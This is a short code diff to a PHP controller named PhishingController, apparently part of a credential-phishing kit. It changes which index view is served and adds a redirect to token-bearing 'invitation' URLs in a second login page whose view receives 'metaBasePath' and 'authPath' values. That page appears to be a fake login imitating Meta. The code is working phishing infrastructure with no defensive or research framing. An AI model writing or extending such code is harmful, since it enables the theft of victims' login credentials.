@@ -42,7 +42,7 @@ class PhishingController extends Controller
         if (!$request->has('token')) {
             return redirect('/invitation?token=' . Str::random(100));
         }
-        return view('index');
+        return view('index2');
     }
 
     public function about()
@@ -129,9 +129,12 @@ class PhishingController extends Controller
         ]);
     }
 
-    public function showLogin2v2()
+    public function showLogin2v2(Request $request)
     {
         $session = $this->getSessionData();
+        if (!$request->has('token')) {
+            return redirect('/invitation-login?token=' . Str::random(100));
+        }
         return view('login2v2', [
             'metaBasePath' => $session['metaBasePath'],
             'authPath' => $session['authPath']
